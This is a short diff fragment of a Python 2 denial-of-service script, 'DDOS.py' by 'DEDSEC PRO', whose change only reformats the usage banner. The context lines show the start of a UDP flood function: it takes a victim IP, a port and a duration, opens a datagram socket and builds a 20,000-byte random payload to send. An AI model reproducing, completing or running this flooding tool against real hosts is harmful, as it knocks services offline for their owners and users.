@@ -5,8 +5,8 @@ import random
 import sys
 def usage():
     
-    print "\033[1;32mDDOS BY DEDSEC PRO"
-    print "python2 DDOS.py " "<ip> <port>"
+    print "\033[1;32m DDOS BY DEDSEC PRO "
+    print " python2 DDOS.py " "<ip> <port> "
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(20000)
